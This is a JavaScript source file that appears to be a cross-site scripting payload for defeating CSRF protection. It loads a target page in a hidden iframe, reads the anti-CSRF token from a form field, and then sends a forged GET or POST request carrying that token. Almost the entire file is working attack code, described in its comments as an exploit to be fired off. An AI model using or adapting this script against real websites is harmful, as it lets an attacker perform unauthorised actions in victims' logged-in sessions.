//Until DOM issues are solved, using iframe in initial xss
var httpExploit = xhrCreate();
var ifr = "";
function testme(){alert(123);}
//Ignore Case used for GET and POST check
String.prototype.equalIgnoreCase = function(str) {
  return (str != null &&
    typeof str === 'string' &&
    this.toUpperCase() === str.toUpperCase());
}
//Main function to be called to fire off exploit
function generateExploit(iframeId,elementId,elementName,url, method, data){
	createElement(iframeId,url,elementId,elementName,method,data);
}

//Get the Key needed for the form field to be used in the CSRF part of the data (querystring or post data)
function getParameterKey(e1,e2){
	return (e1.length>0) ? e1 : e2;
}

//Create the iframe to house the page to exploit - get the CSRF for that form
function createElement(id,url,elementId,elementName,method,data){
	ifr = document.getElementById(id);
	if (ifr.src.length>0){
		ifr.onload = continueAttack(url,elementId,elementName,method,data);
	}
	else{
		ifr = document.createElement('iframe');
		ifr.setAttribute('style','display:none');
		ifr.id = id;
		ifr.src = url;
		ifr.onload = continueAttack(url,elementId,elementName,method,data);
		document.getElementsByTagName('body')[0].appendChild(ifr);
	}
}

//Get the contents of the iframe
function iframeRef() {
    return ifr.contentWindow
        ? ifr.contentWindow.document
        : ifr.contentDocument;
}

//Get the Value of the CSRF
function getElementValue(eId, eName){
	var inside = iframeRef();
	try{
		if (eId == ""){
			return inside.getElementsByName(eName)[0].value;
		}
		else {
			return inside.getElementById(eId).value;
		}
	}
	catch (err){
		console.log(err);
		return "error";
	}
}

function continueAttack(url,elementId,elementName,method,data){
	var elementValue = getElementValue(elementId, elementName);
	exploit(url, method, data, getParameterKey(elementId, elementName), elementValue);
}

//Create the xhr object
function xhrCreate(){
	return (window.ActiveXObject) ? new ActiveXObject("Microsoft.XMLHTTP") : new XMLHttpRequest();
}

//Empty function if needed for readyState == 4
function waitForIt(){
	if (httpExploit.readyState==4){
	}
}

//Function that will exploit the actual payload to the url sent
function exploit(url, method, data, e1, e1Val){
	if (method.equalIgnoreCase("POST")){
		httpExploit.open('post', url, false);
		httpExploit.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
		httpExploit.onreadystatechange = waitForIt;
		data += "&" + e1 + "=" + e1Val;
		httpExploit.send(data);
	}
	else {
		data += "&" + e1 + "=" + e1Val;
		var urlAndParameters = url + "?" + data;
		httpExploit.open('get', urlAndParameters, false);
		httpExploit.onreadystatechange = waitForIt;
		httpExploit.send(data);
	}
}
